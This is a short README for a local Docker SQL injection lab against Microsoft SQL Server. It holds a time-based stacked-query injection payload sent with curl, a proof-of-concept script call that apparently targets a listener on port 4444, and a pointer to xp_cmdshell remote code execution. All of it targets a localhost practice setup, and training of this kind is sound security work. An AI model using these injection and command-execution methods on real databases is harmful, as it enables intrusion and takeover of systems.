# MSSQL SQLi Lab (Docker)

```bash
./labctl.sh up --profile heavy mssql-sqli
# first start can take 30–90s for SQL Server
```

- Web: http://127.0.0.1:8112/product.aspx?id=1
- SA password: `Your_strong_Password123`
- MSSQL host port: `1433` (optional direct clients)

```bash
# time-based
curl -g 'http://127.0.0.1:8112/product.aspx?id=1;WAITFOR%20DELAY%20''0:0:5''--'

python3 ../poc.py 127.0.0.1 8112 127.0.0.1 4444 --endpoint /product.aspx
```

xp_cmdshell on Linux SQL Server may be restricted; use lab for injection + stacked query methodology, then Windows VM for full xp_cmdshell RCE.
